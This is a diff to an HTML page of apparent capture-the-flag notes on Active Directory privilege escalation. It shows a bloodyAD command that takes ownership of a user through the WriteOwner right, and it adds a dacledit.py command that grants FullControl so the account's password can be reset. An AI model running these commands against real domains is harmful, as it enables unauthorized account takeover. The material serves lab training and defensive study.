@@ -144,10 +144,9 @@ set LPORT 9999</code></pre>
                             <p>In case you found that you have the right <b>WriteOwner</b> over a user you can change the ownership of that user making it yours</p>
                             <pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.10.11.72 -d tombwatcher.htb -u "SAM" -p mypassword -k set owner john sam</code></pre>
                             <p>Now that the users is ours we can apply <b>FullControl</b> over it. To do so we will use the following script <a class="notion-link" href="https://raw.githubusercontent.com/ShutDownRepo/impacket/dacledit/examples/dacledit.py"> here </a></p>
+                            <pre><code class="language-bash">python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'USER_OWNED' -target 'USER_TARGER' 'DOMAIN.LOCAL'/'USER_OWNED':'PASSWORD_OWNED'</code></pre>
                             <p>Then apply a password change with bloodAD and the user is yourse :)</p>
                         </ul>
-                        
-                        
 
                     </ul>
                 </div>
